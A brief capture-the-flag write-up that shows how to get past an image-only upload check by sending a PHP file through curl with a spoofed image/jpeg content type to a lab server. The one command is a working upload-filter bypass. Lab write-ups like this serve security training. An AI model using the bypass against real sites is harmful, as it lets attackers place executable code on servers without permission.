# flag10 | image upload

We can see that we have the possibility to upload an image. Let's try to upload a php file.

We can't because it's only accepting jpg, png and gif files.

Let's try with curl to fake the file type and send a php file.

```bash
curl -X POST -F "uploaded=@file.php; type=image/jpeg" -F "Upload=Upload" "http://192.168.56.104/index.php?page=upload" | grep flag
```

